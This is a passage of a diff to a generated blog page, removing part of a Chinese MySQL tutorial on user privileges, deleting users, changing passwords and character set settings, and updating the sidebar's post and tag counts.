-//@<span class="string">"%"</span> 表示对所有非本地主机授权，不包括localhost。（localhost地址设为<span class="number">127.0</span>.<span class="number">0.1</span>，如果设为真实的本地地址，不知道是否可以，没有验证。）
-</code></pre><p>//对localhost授权：加上一句</p>
-<pre><code><span class="operator"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> testDB.* <span class="keyword">to</span> <span class="keyword">test</span>@localhost <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'1234'</span>;</span>即可。
-</code></pre><h2 id="3-删除用户">3.删除用户</h2><pre><code>cmd&gt;mysql -u root -p
-cmd&gt;密码
-mysql&gt;Delete <span class="keyword">FROM</span> user <span class="keyword">Where</span> User=<span class="string">'test'</span> <span class="keyword">and</span> Host=<span class="string">'localhost'</span>;
-mysql&gt;flush privileges;
-mysql&gt;drop database testDB; <span class="comment">//删除用户的数据库</span>
-</code></pre><p>删除账户及权限：</p>
-<pre><code>&gt;drop user 用户名<span class="at_rule">@<span class="string">'%'</span>;</span>
-&gt;drop user 用户名<span class="at_rule">@<span class="preprocessor"> localhost</span>;</span> 
-</code></pre><h2 id="4-修改指定用户密码">4.修改指定用户密码</h2><pre><code>cmd&gt;mysql -u root -p
-cmd&gt;密码
-mysql&gt;<span class="keyword">update</span> mysql.user <span class="built_in">set</span> password=password('新密码') <span class="built_in">where</span> User=<span class="string">"test"</span> <span class="built_in">and</span> Host=<span class="string">"localhost"</span>;
-mysql&gt;flush privileges;
-</code></pre><h2 id="5-字符集相关操作">5.字符集相关操作</h2><p>mysql&gt;show database;<br>|<strong>查看所有数据库：</strong>show databases ;<br>|<strong>创建数据库：</strong>create database 数据库名；<br>|<strong>创建指定字符集数据库：</strong>    create database test2 default character set utf8<br>|<strong>查看指定数据库使用字符集：</strong>show create database 数据库名；<br>|<strong>删除数据库：</strong>drop database 数据库名;<br>|<strong>查看数据关于字符集的默认配置：</strong> show variables like ‘character%’;<br>|<strong>修改字符集的方法（结合上一句）：</strong></p>
-<pre><code><span class="operator"><span class="keyword">SET</span> character_set_client = utf8 ;</span>
-<span class="operator"><span class="keyword">SET</span> character_set_connection = utf8 ;</span> 
-<span class="operator"><span class="keyword">SET</span> character_set_results = utf8 ;</span> 
-<span class="operator"><span class="keyword">SET</span> character_set_server = utf8 ;</span> 
-<span class="operator"><span class="keyword">SET</span> collation_connection = utf8 ;</span> 
-<span class="operator"><span class="keyword">SET</span> collation_database = utf8 ;</span> 
-<span class="operator"><span class="keyword">SET</span> collation_server = utf8 ;</span> 
-</code></pre></span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1975,7 +2050,7 @@ mysql&gt;flush privileges;
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">21</span>
+              <span class="site-state-item-count">23</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1989,7 +2064,7 @@ mysql&gt;flush privileges;
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-count">17</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
